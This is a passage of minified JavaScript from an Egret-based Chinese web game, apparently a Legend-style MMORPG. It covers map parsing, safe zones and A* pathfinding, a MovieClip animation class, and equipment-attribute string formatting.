n?i=n.hidden:console.log("地图:"+this.mapID+"副本:"+this._fubenID+"坐标:"+t+","+e+"出现问题!"),i},e.parser=function(t){this.lastFbId=this.fubenID,this.fubenID=t.readInt(),this.mapID=t.readInt(),this.mapX=t.readShort(),this.mapY=t.readShort(),this.lastFbTyp=this.fbType,this.fbType=t.readByte();var i=this.getFileName(),n=this.mapZip[i],o=h.GlobalConfig.ScenesConfig[this.mapID];o&&(n.maxX=o.sizeX,n.maxY=o.sizeY),this.CELL_SIZE=n.title_wh,this.MAX_HEIGHT=n.pixHeight,this.MAX_WIDTH=n.pixWidth,this.COL=n.maxX,this.ROW=n.maxY,this.grid.initMapInfo(n,e.getTurn()),this.aStar.initFromMap(this.grid),this.SafetyZone={};for(var s=h.GlobalConfig.ScenesConfig[this.mapID],a=0;s.area&&a<s.area.length;a++)for(var r=s.area[a],l=r.attr,u=0;u<l.length;u++)switch(l[u].type){case 0:this.safetyCalculate(r)}},e.safetyCalculate=function(t){for(var i=t.grids,n=Number.MAX_VALUE,o=Number.MAX_VALUE,s=Number.MIN_VALUE,a=Number.MIN_VALUE,r=!1,l=0;l<i.length;l++){for(var h=i[l],p=l+1==i.length?i[0]:i[l+1],d=u.BresenhamLine.tileLine(h.x,h.y,p.x,p.y),c=0;c<d.length;c+=2){var f=d[c],g=d[c+1];this.SafetyZone[g*e.CELL_SIZE+f]={x:f,y:g},r=!0}n=Math.min(h.x,n),s=Math.max(h.x,s),o=Math.min(h.y,o),a=Math.max(h.y,a)}if(r)for(var l=o;a>=l;l++){for(var m=void 0,v=void 0,y=n;s>=y;y++)if(this.SafetyZone[l*e.CELL_SIZE+y]){m=y;break}for(var y=s;y>=n;y--)if(this.SafetyZone[l*e.CELL_SIZE+y]){v=y;break}if(!isNaN(m)&&!isNaN(v))for(var y=m+1;v>=y;y++)this.SafetyZone[l*e.CELL_SIZE+y]={x:l,y:y}}},e.checkSafety=function(t){return!!this.SafetyZone[t.y*e.CELL_SIZE+t.x]},Object.defineProperty(e,"fubenID",{get:function(){return this._fubenID},set:function(t){this._fubenID=t,t>0&&l.GameLogic.ins().postHookStateChange(l.GameLogic.HOOK_STATE_HOOK)},enumerable:!1,configurable:!0}),e.sceneInMain=function(){return 20==e.fbType&&50002==e.fubenID},e.sceneInMine=function(){return 0==e.fbType&&0!=e.fubenID},e.canStartAI=function(){return 0==e.fbType},e.getFileName=function(){var t=h.GlobalConfig.ScenesConfig[this.mapID];return t?t.mapfilename:""},e.getTurn=function(){return h.GlobalConfig.ScenesConfig[this.mapID].turn},e.autoPunch=function(){return 1==h.GlobalConfig.ScenesConfig[this.mapID].autoPunch},e.getRectangle=function(t,i,n){var o=t.x+(i-.5)*e.CELL_SIZE,s=t.y+(n-.5)*e.CELL_SIZE;return new egret.Rectangle(o,s,e.CELL_SIZE,e.CELL_SIZE)},e.getIncludeElement=function(t,i,n){var o=[];for(var s in i){var a=e.getRectangle(t,i[s].x,i[s].y);for(var r in n){var l=n[r];l.x>=a.x&&l.y>=a.y&&l.x<a.x+a.width&&l.y<a.y+a.height&&o.push(l)}}return o},e.getPoint=function(t,e,i){var n=Math.floor(t/e)-Math.floor(i/2),o=Math.floor(t%e)-Math.floor(e/2);return new egret.Point(o,n)},e.getTargetIndex=function(t,i,n,o){var s=i.x-t.x+e.CELL_SIZE*(n/2),a=i.y-t.y+e.CELL_SIZE*(o/2),r=Math.floor(s/e.CELL_SIZE),l=Math.floor(a/e.CELL_SIZE);return n*l+r},e.checkWalkableByPixel=function(t,i){var n=Math.floor(t/e.CELL_SIZE),o=Math.floor(i/e.CELL_SIZE);return e.checkWalkable(n,o)},e.getPosRange=function(t,i,n){var o=p.MathUtils.limitInteger(-n,+n),s=p.MathUtils.limitInteger(-n,+n);+o!=+n&&(s=Math.random()<.5?-n:n);for(var a=0,r=o,l=s;;){var h=e.checkWalkable(t+r,i+l);if(h)return[t+r,i+l];if(r==n&&n>l?l+=1:l==n&&r>-n?r-=1:r==-n&&l>-n?l-=1:l==-n&&n>r&&(r+=1),r==o&&l==s&&(o==n&&(r=o=n+1),o==-n&&(r=o=-n-1),s==n&&(l=s=n+1),s==-n&&(l=s=-n-1),n+=1),a+=1,a>100)break}return[t,i]},e.getPosRangeByDir=function(t,i,n,o){var s=t,a=i;return(n>=0&&1>=n||7==n)&&(a-=o),n>=3&&5>=n&&(a+=o),n>=1&&3>=n&&(s+=o),n>=5&&7>=n&&(s-=o),[s,a,e.checkWalkable(s,a)]},e.getPosRangeRandom=function(t,i,n,o){void 0===o&&(o=1);var s=e.point2Grip(t),a=e.point2Grip(i),r=[n],l=Math.random();l>.66?(n=0>n-1?7:n-1,r.unshift(n),l>.8?r.push((n+2)%8):r.splice(1,0,(n+2)%8)):l>.33&&(n=n+1>7?0:n+1,r.unshift(n),l>.5?r.push((n-2+8)%8):r.splice(1,0,(n-2+8)%8));for(var h,u=!1,p=0;p<r.length;p++)if(h=e.getPosRangeByDir(s,a,r[p],o),h[2]){u=!0;break}return u||(h=e.getPosRange(s,a,o)),h},e.point2Grip=function(t){return Math.floor(t/e.CELL_SIZE)},e.grip2Point=function(t){return t*e.CELL_SIZE+(e.CELL_SIZE>>1)},e.findPath=function(t,i){var n=Math.floor(t.x/64),o=Math.floor(t.y/64),s=Math.floor(i.x/64),a=Math.floor(i.y/64);e.grid.isWalkableTile(s,a)||console.error("目标点不可行走",s,a);var r,l=e.aStar.getPath(n,o,s,a);if(l){r=l.concat();for(var h=void 0,u=r.length-1;u>=0;u--)isNaN(h)?h=r[u].nDir:h==r[u].nDir?r.splice(u+1,1):h=r[u].nDir}return[l,r]},e.getAroundPath=function(t,i){for(var n=64,o=Math.floor(i.x/n),a=Math.floor(i.y/n),r=Number.MAX_VALUE,l=0,h=0,u=0;8>u;++u){var p=8>u?s.AStar.NEIGHBORPOS_X_VALUES[u]:s.AStar.NEIGHBORPOS_X_VALUES2[u-8],d=8>u?s.AStar.NEIGHBORPOS_Y_VALUES[u]:s.AStar.NEIGHBORPOS_Y_VALUES2[u-8],c=o+p,f=a+d,g=(c+.5)*n,m=(f+.5)*n;if(!(0>c||c>=this.COL||0>f||f>=this.ROW)&&e.grid.isWalkableTile(c,f)){var v=Math.pow(g-i.x,2)+Math.pow(m-i.y,2);r>v&&(r=v,l=g,h=m)}}return l&&h?this.findPath(t,{x:l,y:h}):null},e._fbType=0,e.lastFbTyp=0,e.lastFbId=0,__decorate([post()],e,"postFbType",null),e}(n.BaseClass);e.GameMap=g,window.GameMap=g,__reflect(g.prototype,"GameMap",[]),window.GameMap=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MovieClip=void 0;var n=i(16),o=i(715),s=i(716),a=i(70),r=function(t){function e(){var e=t.call(this)||this;return e.rate=1,e.pixelHitTest=!1,e.hitTestEnabled=!1,e.P0={x:0,y:0},e.P2={x:0,y:0},e.P1={x:0,y:0},e.P12={x:0,y:0},e.factorValue=1,e._mcFactory=new egret.MovieClipDataFactory,e}return __extends(e,t),e.create=function(t,i,n,o){void 0===i&&(i=1),void 0===n&&(n=null),void 0===o&&(o=!0);var s=new e;return s.playFile(t,i,n,o),s},e.createCenterGruop=function(t,e,i,n){void 0===e&&(e=1),void 0===i&&(i=null),void 0===n&&(n=!0);var o=new eui.Group;return o.horizontalCenter=o.verticalCenter=0,o.addChild(this.create(t,e,i,n)),o},e.prototype.$hitTest=function(e,i){var n=t.prototype.$hitTest.call(this,e,i);return n&&this.pixelHitTest&&!this.hitTestPoint(e,i,!0)?null:this.hitTestEnabled?n:null},e.prototype.playFile=function(t,i,n,o){var s=this;void 0===i&&(i=1),void 0===n&&(n=null),void 0===o&&(o=!0),this.time=egret.getTimer(),this._compFun=n,this.playCount=i,this.remove=o,Timer.stop(this.playComp,this);var a=t.split("|"),r=a[0],l=a[1];return this.name==r&&this.texture&&this.texture.bitmapData?void this.createBody(l):(this.name=r,e.removeCount(this),this.jsonData=null,this.texture=null,RES.getResByUrl(this.name+".json",function(t,e){e.indexOf(s.name)<0||!t||(s.jsonData=t,s.createBody(l))},this,RES.ResourceItem.TYPE_JSON),void RES.getResByUrl(this.name+".png",function(t,i){i.indexOf(s.name)<0||!t||(s.texture=t,s.texture.bitmapData?e.addCount(s):RES.destroyRes(s.name+".png"),s.createBody(l))},this,RES.ResourceItem.TYPE_IMAGE))},e.prototype.$onAddToStage=function(i,n){t.prototype.$onAddToStage.call(this,i,n),e.addCount(this)},e.prototype.$onRemoveFromStage=function(){t.prototype.$onRemoveFromStage.call(this),e.removeCount(this)},e.prototype.createBody=function(t){if(this.jsonData&&this.texture){this.visible=!0,void 0!=this.angle&&this.drawAngle(this.angle),this._mcFactory.clearCache(),this._mcFactory.mcDataSet=this.jsonData,this._mcFactory.texture=this.texture;var i=this.name.split("/"),n=t||i.pop();if(this.movieClipData=this._mcFactory.generateMovieClipData(n),this.name in e.originalRate||(e.originalRate[this.name]=this.movieClipData.frameRate),this.frameRate=e.originalRate[this.name]*this.rate>>0,this.gotoAndPlay(1,this.playCount),this.playCount>0){var o=egret.getTimer()-this.time;o=this.playTime*this.playCount-o,o>0?Timer.start(o,1,this.playComp,this):this.playComp()}this.dispatchEventWith(egret.Event.CHANGE)}},e.prototype.playComp=function(){this.stage&&this._compFun&&(this._compFun(),this._compFun=null),this.remove&&n.DisplayUtils.removeFromParent(this)},Object.defineProperty(e.prototype,"playTime",{get:function(){return this.movieClipData?1/this.frameRate*this.totalFrames*1e3:0},enumerable:!1,configurable:!0}),e.addCount=function(t){if(t.stage&&t.texture&&t.texture.bitmapData){var i=t.texture.bitmapData.hashCode;if(!e.displayList[i])return void(e.displayList[i]=[t]);var n=e.displayList[i];n.indexOf(t)<0&&n.push(t)}},e.removeCount=function(t){if(t.texture&&t.texture.bitmapData){var i=t.texture.bitmapData.hashCode;if(e.displayList[i]){var n=e.displayList[i],o=n.indexOf(t);o>=0&&n.splice(o,1),0==n.length&&delete e.displayList[i]}}},e.prototype.drawAngle=function(t){if(this.angle=t,this.jsonData&&this.texture&&this.texture.bitmapData){var e=Object.keys(this.jsonData.res);if(e&&e.length){var i=this.jsonData.res[e[0]].w,n=new egret.CustomFilter(o.baseVertex,s.cdshader_mc,{time:t/360,PI:Math.PI,w:this.texture.bitmapData.width,h:this.texture.bitmapData.height,frameW:i});this.filters=[n]}}},e.prototype.drawRect=function(t){var e=new egret.CustomFilter(o.baseVertex,s.cdshader_mc_rect,{value:t});this.filters=[e]},Object.defineProperty(e.prototype,"factor",{get:function(){return 0},set:function(t){this.factorValue=t,this.x=(1-t)*(1-t)*this.P0.x+2*t*(1-t)*this.P1.x+t*t*this.P2.x,this.y=(1-t)*(1-t)*this.P0.y+2*t*(1-t)*this.P1.y+t*t*this.P2.y},enumerable:!1,configurable:!0}),e.prototype.setOfTwoPos=function(t){var e=a.MathUtils.random(0,1);if(Math.abs(this.P2.x-this.P0.x)<.001&&Math.abs(this.P2.y-this.P0.y)<.001);else{var i=a.MathUtils.getDistance(this.P0.x,this.P0.y,this.P2.x,this.P2.y),n=void 0,o=void 0;if(n=(this.P0.x+this.P2.x)/2,o=(this.P0.y+this.P2.y)/2,Math.abs(this.P0.x-this.P2.x)<.5){this.P1.y=o,this.P12.y=o;var s=Math.sqrt(3)/2*i;this.P1.x=n+s,this.P12.x=n-s}else if(Math.abs(this.P0.y-this.P2.y)<.5){this.P1.x=n,this.P12.x=n;var s=Math.sqrt(3)/2*i;this.P1.y=o+s,this.P12.y=o-s}else{var r=void 0,l=void 0,h=void 0,u=void 0;r=(this.P2.y-this.P0.y)/(this.P2.x-this.P0.x),h=this.P0.y-r*this.P0.x,l=-1/r,u=o-l*n;var p=2*l*(u-o)-2*n,d=l*l+1,c=n*n+(u-o)*(u-o)-.75*i*i,f=p*p-4*d*c;f=Math.sqrt(p*p-4*d*c);var g=void 0,m=void 0,v=void 0,y=void 0;g=(-p+f)/(2*d),m=(-p-f)/(2*d),v=g*l+u,y=m*l+u,v>o?0==e?(this.P1.x=g,this.P1.y=v):(this.P1.x=m,this.P1.y=y):0==e?(this.P1.x=m,this.P1.y=y):(this.P1.x=g,this.P1.y=v)}}this.mathThirdPos(t)},e.prototype.changeAngle=function(){},e.prototype.mathAngle=function(){var t,e;this.P2.x<this.P1.x?this.P1.y>this.P2.y?(t=this.P2.x+(this.P1.x-this.P2.x)*(1-this.factorValue),e=this.P2.y+(this.P1.y-this.P2.y)*(1-this.factorValue)):(t=this.P2.x+(this.P1.x-this.P2.x)*(1-this.factorValue),e=this.P1.y+(this.P2.y-this.P1.y)*this.factorValue):this.P1.y>this.P2.y?(t=this.P1.x+(this.P2.x-this.P1.x)*this.factorValue,e=this.P2.y+(this.P1.y-this.P2.y)*(1-this.factorValue)):(t=this.P1.x+(this.P2.x-this.P1.x)*this.factorValue,e=this.P1.y+(this.P2.y-this.P1.y)*this.factorValue);var i=a.MathUtils.getAngle(a.MathUtils.getRadian2(this.x,this.y,t,e));this.rotation=i},e.prototype.mathThirdPos=function(t){var e,i,n=t/10;Math.abs(this.P0.x-this.P2.x)<.5?(e=this.P0.x,i=this.P2.y>this.P0.y?this.P0.y+(this.P2.y-this.P0.y)/2:this.P2.y+(this.P0.y-this.P2.y)/2):Math.abs(this.P0.y-this.P2.y)<.5?(e=this.P2.x>this.P0.x?this.P0.x+(this.P2.x-this.P0.x)/2:this.P2.x+(this.P0.x-this.P2.x)/2,i=this.P0.y):(e=this.P2.x>this.P0.x?this.P0.x+(this.P2.x-this.P0.x)/2:this.P2.x+(this.P0.x-this.P2.x)/2,i=this.P2.y>this.P0.y?this.P0.y+(this.P2.y-this.P0.y)/2:this.P2.y+(this.P0.y-this.P2.y)/2);var o,s,r=a.MathUtils.getDistance(this.P1.x,this.P1.y,e,i),l=r*(1-n);s=l*(i-this.P1.y)/r+this.P1.y,o=l*(e-this.P1.x)/r+this.P1.x,this.P1.x=o,this.P1.y=s},e.originalRate={},e.displayList=egret.createMap(),e}(egret.MovieClip);e.MovieClip=r,window.MovieClip=r,__reflect(r.prototype,"MovieClip",[]),window.MovieClip=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AttributeData=void 0;var n=i(55),o=i(42),s=i(0),a=i(10),r=i(278),l=i(279),h=i(34),u=i(39),p=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=0),this.type=t,this.value=e}return t.AttrAddition=function(e,i){if(!e||e.length<=0)return i?i.concat():null;if(!i||i.length<=0)return e?e.concat():null;for(var n=e.concat(i),o=[],s=n.length,a={},r=0;s>r;r++)void 0==a[n[r].type]&&(a[n[r].type]=0),a[n[r].type]+=n[r].value;for(var l in a)o.push(new t(+l,+a[l]));return o},t.AttrDel=function(e,i){for(var n=[],o=0;o<e.length;o++){var s=new t;s.type=0!=e[o].type?e[o].type:i[o].type,s.value=e[o].value-i[o].value,n.push(s)}return n},t.AttrMultiply=function(e,i){for(var n=[],o=0;o<e.length;o++){var s=new t;s.type=0!=e[o].type?e[o].type:i[o].type,s.value=e[o].value*(1+i[o].value/1e4),n.push(s)}return n},t.transformAttr=function(e){var i=[];for(var n in e){var o=new t;o.type=e[n].type,o.value=e[n].value,i.push(o)}for(var s=0;s<i.length-1;s++)for(var a=0;a<i.length-s-1;a++)if(i[a]<i[a+1]){var r=i[a+1];i[a+1]=i[a],i[a]=r}return i},t.getAttStr1=function(e,i,n){void 0===n&&(n=!0);var a="";if(e instanceof t)a+=this.getAttStrByType1(e,i);else for(var l=s.GlobalConfig.AttrConfig,h=0;h<e.length;h++)if(e[h].type>=r.RUNE_POS_ATTR_MIN){""!=a&&(a+=o.StringUtils.repeatStr("\n",i.emptyLine+1));var u=this.getAttStrByType1(e[h],i);if(!u)continue;a+=u}else{if(n&&0==l[e[h].type].relation)continue;""!=a&&(a+=o.StringUtils.repeatStr("\n",i.emptyLine+1));var p=n?this.getRelationAtt(e[h],e):null,u=this.getAttStrByType1(e[h],i,p);if(!u)continue;a+=u}return a},t.getRelationAtt=function(t,e){var i=s.GlobalConfig.AttrConfig,n=i[t.type].relation;if(n>0)for(var o in e)if(e[o].type==n)return e[o];return null},t.getAttStrByType1=function(e,i,n){var a,l,h;void 0===i&&(i=null),void 0===n&&(n=null);var u=e.type;if(u>=r.RUNE_POS_ATTR_MIN){var p=t.getEEquipAttrStrByType(u),d=100*e.value/1e4+"%";if(!i)return p+"+"+d;var c=i.wordColor,f=o.StringUtils.addColor((i.isShowAttName?p:"")+i.sign,c);f=o.StringUtils.complementByChar(f,i.intervals);var g=(null===(a=s.GlobalConfig.AttrConfig[u])||void 0===a?void 0:a.attrColor)||i.attrColor,m=f+o.StringUtils.addColor(d+i.endSign,g);return m}var v=t.getAttrStrByType(e.type,null===i||void 0===i?void 0:i.nameType),d=t.getAttrValStr(e)+(n?" - "+t.getAttrValStr(n):"");if(!i)return v+"+"+d;var c=(null===(l=s.GlobalConfig.AttrConfig[u])||void 0===l?void 0:l.wordColor)||i.wordColor,f=o.StringUtils.addColor((i.isShowAttName?v:"")+i.sign,c);f=o.StringUtils.complementByChar(f,i.intervals);var g=(null===(h=s.GlobalConfig.AttrConfig[u])||void 0===h?void 0:h.attrColor)||i.attrColor,m=f+o.StringUtils.addColor(d+i.endSign,g);return m},t.getExtAttStrByType=function(e,i,n,s,a){void 0===i&&(i=4),void 0===n&&(n="+"),void 0===s&&(s=!1),void 0===a&&(a=!0);var r="";return a&&(r=o.StringUtils.complementByChar(t.getExtAttrStrByType(e.type),8*i)),r+=e.type==l.ExAttributeType.eatGodBlessRate||e.type==l.ExAttributeType.eatGodBlessProbability||e.type==l.ExAttributeType.eatAttackAddHpProbability||e.type==l.ExAttributeType.eatDeathCurseProbability||e.type==l.ExAttributeType.eatAddWarriorDamageInc||e.type==l.ExAttributeType.eatAddMageDamageInc||e.type==l.ExAttributeType.eatAddTaoistDamageInc||e.type==l.ExAttributeType.eatAddToTaoistDamageInc||e.type==l.ExAttributeType.eatSubWarriorDamageInc||e.type==l.ExAttributeType.eatSubMageDamageInc||e.type==l.ExAttributeType.eatSubTaoistDamageInc||e.type==l.ExAttributeType.eatTogetherHitFree||e.type==l.ExAttributeType.eatMiss||e.type==l.ExAttributeType.eatTogetherHitMonDamageInc||e.type==l.ExAttributeType.eatTogetherHitRoleDamageInc||e.type==l.ExAttributeType.eatAddToWarriorDamageInc||e.type==l.ExAttributeType.eatAddToMageDamageInc||e.type==l.ExAttributeType.eatAddToMageDamageInc||e.type==l.ExAttributeType.eatDeathCurseDamageIncrease||e.type==l.ExAttributeType.eatTogetherHitAddHuntRate||e.type==l.ExAttributeType.eatTogetherHitAddAngerProbility||e.type==l.ExAttributeType.eatTogetherHitAddAngerRate||e.type==l.ExAttributeType.eatTogetherHitCritRate?n+e.value/100+"%":e.type==l.ExAttributeType.eatDeathCurseTime?n+e.value/1e3+"秒":e.type==l.ExAttributeType.eatIgnoreReflect?"":n+e.value},t.inserteBlank=function(t,e,i){void 0===i&&(i=1);for(var n=t.length,o="";e--;)o+=" ";var s="";switch(i){case 0:s=o+t;break;case 1:s=t.slice(0,n/2)+o+t.slice(n/2);break;case 2:s=t+o}return s},t.getAttrInfoByItemData=function(e,i){void 0===i&&(i=null);var n=s.GlobalConfig.EquipConfig[e.configID],o="",r=0;for(var l in this.translate)if(n[l]&&!(n[l]<=0)){o+=t.getAttrStrByType(this.translate[l])+": "+n[l];for(var h=0,p=0;p<e.att.length;p++)r=e.att[p].type,this.translate[l]==r&&(h+=e.att[p].value);if(h)o+=" +"+h;else if(i&&a.ItemUtil.getType(e.itemConfig)==u.ItemType.TYPE_26){var d=[],c=0;4==Object.keys(d).length&&c&&(o+=" +"+n[l]*s.GlobalConfig.LeitingEquipBaseConf.trimSuitAttrAdd[c-3][1]/1e4)}o+="\n"}return o},t.getAttrStrByType=function(t,e){void 0===e&&(e=0);var i=s.GlobalConfig.AttrConfig[t];return i?i["name"+e]||i.name||"":""},t.getAttrStrByTypeTotem=function(t){var e=s.GlobalConfig.AttrConfig[t];if(!e)return"";var i=e.name;return(t==h.AttributeType.atAtkMin||t==h.AttributeType.atAtkMax||t==h.AttributeType.atAtkTaoistMin||t==h.AttributeType.atAtkTaoistMax||t==h.AttributeType.atAtkMageMin||t==h.AttributeType.atAtkMageMax||t==h.AttributeType.atRes||t==h.AttributeType.atDef)&&(i=e.name2),i},t.getAttrSuffixByType=function(t,e){var i;return(null===(i=e[t])||void 0===i?void 0:i.suffix)||""},t.getAttrDivisorByType=function(t,e){var i;return(null===(i=e[t])||void 0===i?void 0:i.divisor)||1},t.getAttrValStr=function(e,i){return void 0===i&&(i=s.GlobalConfig.AttrConfig),e.value/t.getAttrDivisorByType(e.type,i)+t.getAttrSuffixByType(e.type,i)},t.getAttrValStrByType=function(e,i,n){return void 0===n&&(n=s.GlobalConfig.AttrConfig),i/t.getAttrDivisorByType(e,n)+t.getAttrSuffixByType(e,n)},t.getExtAttrStrByType=function(t,e){void 0===e&&(e=0);var i=s.GlobalConfig.ExAttrConfig[t];return i?i["name"+e]||i.name:""},t.getExAttrNameByAttrbute=function(e,i){var n,a,r;void 0===i&&(i=null);var l=e.type,h=s.GlobalConfig.ExAttrConfig;if(!(null===(n=h[l])||void 0===n?void 0:n.name))return"";var u=t.getExtAttrStrByType(e.type,null===i||void 0===i?void 0:i.nameType),p=t.getAttrValStr(e,h);if(!i)return u+"+"+p;var d=(null===(a=h[l])||void 0===a?void 0:a.wordColor)||i.wordColor,c=o.StringUtils.addColor((i.isShowAttName?u:"")+i.sign,d);c=o.StringUtils.complementByChar(c,i.intervals);var f=(null===(r=h[l])||void 0===r?void 0:r.attrColor)||i.attrColor,g=c+o.StringUtils.addColor(p+i.endSign,f);return g},t.getEEquipAttrStrByType=function(t){var e="";switch(t){case r.EquipAddAttrType.EquipSlotType_Weapon:e=gettext("武器基础属性");break;case r.EquipAddAttrType.EquipSlotType_Helmet:e=gettext("头盔基础属性");break;case r.EquipAddAttrType.EquipSlotType_Coat:e=gettext("衣服基础属性");break;case r.EquipAddAttrType.EquipSlotType_Necklace:e=gettext("项链基础属性");break;case r.EquipAddAttrType.EquipSlotType_Accessory1:e=gettext("手镯基础属性");break;case r.EquipAddAttrType.EquipSlotType_Accessory2:e=gettext("腰带基础属性");break;case r.EquipAddAttrType.EquipSlotType_Ring1:e=gettext("戒指基础属性");break;case r.EquipAddAttrType.EquipSlotType_Ring2:e=gettext("鞋子基础属性")}return e},t.getAttrNameByAttrbute=function(e,i,n,o,s){void 0===i&&(i=!1),void 0===n&&(n="："),void 0===o&&(o=!1),void 0===s&&(s=void 0);var a=t.getAttrStrByType(e.type);o&&(a=t.inserteBlank(a,7));var r="";if(i)switch(e.type){case h.AttributeType.atCrit:case h.AttributeType.atTough:r=e.value/100+"%";break;default:r=e.value+""}return void 0!=s?a=""+a+n+"|C:"+s+"&T:"+r+"|":a+=n+r,a},t.getPercentAttr=function(e,i){for(var n=[],o=0;o<e.length;o++){var s=new t;s.type=e[o].type,s.value=Math.floor(e[o].value*(1+i)),n.push(s)}return n},t.sortAttribute=function(t,e){return n.Algorithm.sortAsc(t.type,e.type)},t.copyAttrbute=function(e){var i=new t;return i.type=e.type,i.value=e.value,i},t.addAttrToList=function(e,i){if(!e[i.type]){var n=new t;n.type=i.type,n.value=0,e[i.type]=n}var o=e[i.type];o.value+=i.value},t.combineAtts=function(e){if(!e||!e.length)return null;for(var i=[],n=e.length,o={},s=0;n>s;s++)void 0==o[e[s].type]&&(o[e[s].type]=0),o[e[s].type]+=e[s].value;for(var a in o)i.push(new t(+a,+o[a]));return i},t.getAttrFromCfg=function(e){var i=[];for(var n in t.translate)if(!(null==e[n]||e[n]<0)){var o=new t;o.type=parseInt(t.translate[n]),o.value=e[n],i.push(o)}return i},t.getAttrsByArray=function(e){for(var i=0,n=e.length,o=[];;){var s=e[i],a=s[0],r=s[1];if(o.push(new t(a,r)),i++,i>=n)break}return o},t.getAttrShowStr=function(e,i,n,o,r,l){var u;void 0===i&&(i=""),void 0===n&&(n=[]),void 0===o&&(o=!1),void 0===r&&(r=0);for(var p="",d=!1,c=0,f=0,g=0;g<e.length;g++)e[g].type&&!(null===(u=s.GlobalConfig.AttrConfig[e[g].type])||void 0===u?void 0:u.relation)&&c++;for(var g=0;g<e.length;g++){var m=e[g],v=s.GlobalConfig.AttrConfig[m.type];if(!(m.type<=0)){d=!0;var y=m.type,C=n[g]?"color="+a.ItemUtil.getQualityColor(n[g]||0):"";l&&(C="color="+l);var T=v.divisor?m.value/v.divisor:m.value;y!=h.AttributeType.atAtkMin&&y!=h.AttributeType.atAtkMageMin&&y!=h.AttributeType.atAtkTaoistMin&&y!=h.AttributeType.atDef?(y==h.AttributeType.atAtkMax||y==h.AttributeType.atAtkMageMax||y==h.AttributeType.atAtkTaoistMax||y==h.AttributeType.atRes?(p+=t.getAttrStrByType(m.type)+(o?t.inserteBlank(" ",r):""),p+=" - "+T,f++,p+=f>=c?"":"\n"):(p+="<a "+C+">"+t.getAttrStrByType(m.type)+(o?t.inserteBlank(" ",r):""),p+=i+(""+T),v.suffix&&(p+=v.suffix),f++,p+=f>=c?"":"\n"),p+="</a>"):(p+="<a "+C+">"+t.getAttrStrByType(m.type)+(o?t.inserteBlank(" ",r):""),p+=i+T)}}return d?p:""},t.getAttrShowStrNoColor=function(e,i,n,o,a){var r;void 0===i&&(i=""),void 0===n&&(n=!1),void 0===o&&(o=0),void 0===a&&(a=!1);for(var l="",u=!1,p=0,d=0;d<e.length;d++)e[d].type&&!(null===(r=s.GlobalConfig.AttrConfig[e[d].type])||void 0===r?void 0:r.relation)&&p++;for(var c=!1,f=-2,d=0;d<e.length;d++)(e[d].type==h.AttributeType.atDef||e[d].type==h.AttributeType.atAtkMin||e[d].type==h.AttributeType.atAtkMageMin||e[d].type==h.AttributeType.atAtkTaoistMin)&&(f=e[d].type+1),e[d].type==f&&(c=!0);for(var d=0;d<e.length;d++){var g=e[d],m=s.GlobalConfig.AttrConfig[g.type];if(!(g.type<=0)){u=!0;var v=g.type;l+=c&&(v==f||v==f-1)?t.getAttrStrByType(g.type)+(n?t.inserteBlank(" ",o):""):t.getAttrStrByTypeTotem(g.type)+(n?t.inserteBlank(" ",o):"");var y=m.divisor?g.value/m.divisor:g.value;if(u)if(v==f||v==f-1)if(v==h.AttributeType.atAtkMin||v==h.AttributeType.atAtkMageMin||v==h.AttributeType.atAtkTaoistMin||v==h.AttributeType.atDef){l+=i+y;var C=e[d+1];C&&C.type!=v+1&&(l+="\n")}else v==h.AttributeType.atAtkMax||v==h.AttributeType.atAtkMageMax||v==h.AttributeType.atAtkTaoistMax||v==h.AttributeType.atRes?l+=" - "+y:(l+=i+(""+y),m.suffix&&(l+=m.suffix));else l+=i+(""+y),m.suffix&&(l+=m.suffix),l+=a&&d<e.length-1?"\n":"    ";else l+=i+(""+y),m.suffix&&(l+=m.suffix),l+=a&&d<e.length-1?"\n":"    "}}return u?l:""},t.getAttrNum2=function(e,i,n,o,r,l){var u;void 0===i&&(i=""),void 0===n&&(n=[]),void 0===o&&(o=!1),void 0===r&&(r=0);for(var p="",d=!1,c=0,f=0,g=0;g<e.length;g++)e[g].type&&!(null===(u=s.GlobalConfig.AttrConfig[e[g].type])||void 0===u?void 0:u.relation)&&c++;for(var g=0;g<e.length;g++){var m=e[g],v=s.GlobalConfig.AttrConfig[m.type];if(!(m.type<=0)){d=!0;var y=m.type,C=n[g]?"color="+a.ItemUtil.getQualityColor(n[g]||0):"";l&&(C="color="+l),p+="<a "+C+">"+t.getAttrStrByType(m.type)+(o?t.inserteBlank(" ",r):"");var T=v.divisor?m.value/v.divisor:m.value;y==h.AttributeType.atAtkMin||y==h.AttributeType.atAtkMageMin||y==h.AttributeType.atAtkTaoistMin||y==h.AttributeType.atDef?p+=i+T:y==h.AttributeType.atAtkMax||y==h.AttributeType.atAtkMageMax||y==h.AttributeType.atAtkTaoistMax||y==h.AttributeType.atRes?(p+=" - "+T,f++,p+=f>=c?"":"\n"):(p+=i+(""+T),v.suffix&&(p+=v.suffix),f++,p+=f>=c?"":"\n"),p+="</a>"}}return f},t.getAttrNum=function(t){var e=0;if(t)for(var i in t){var n=t[i];if(!(n.type<=0)){var o=n.type;o==h.AttributeType.atAtkMin||o==h.AttributeType.atAtkMageMin||o==h.AttributeType.atAtkTaoistMin||o==h.AttributeType.atDef||(o==h.AttributeType.atAtkMax||o==h.AttributeType.atAtkMageMax||o==h.AttributeType.atAtkTaoistMax||o==h.AttributeType.atRes?e++:e++)}}return e},t.getAttrBySacrifice=function(e,i,n,o,s,r){void 0===i&&(i=[]),void 0===n&&(n=[]),void 0===o&&(o=!1),void 0===s&&(s=0);for(var l="",h=!1,u=0,p=0,d=0;d<e.length;d++)u++;for(var d=0;d<e.length;d++){var c=e[d];if(!(c.type<=0)){h=!0;var f=n[d]?"color="+a.ItemUtil.getQualityColor(n[d]||0):"";r&&(f="color="+r);var g=c.value/100,m=":+",v="4";if(i.length){m="  ";var y="";g>i[d].value/100?(f="color=2149168",y="+"):g<i[d].value/100&&(f="color=14287362");var C=i[d].value/100;v=(g-C).toFixed(2),l+=t.getAttrStrByType(c.type,2)+(o?t.inserteBlank(" ",s):""),l+=m+("<a "+f+">")+(""+g),l+="%"}else l+="<a "+f+">"+t.getAttrStrByType(c.type,2)+(o?t.inserteBlank(" ",s):""),l+=m+(""+g),l+="%";p++,l+=p>=u?"":"\n",l+="</a>"}}return h?l:""},t.getAttrNumforSacrifice=function(t){var e=0;if(t)for(var i in t){var n=t[i];n.type<=0||e++}return e},t.getAttrBySacrifice2=function(e,i,n,o,a,r,l){void 0===i&&(i=[]),void 0===n&&(n=":"),void 0===o&&(o=-1),void 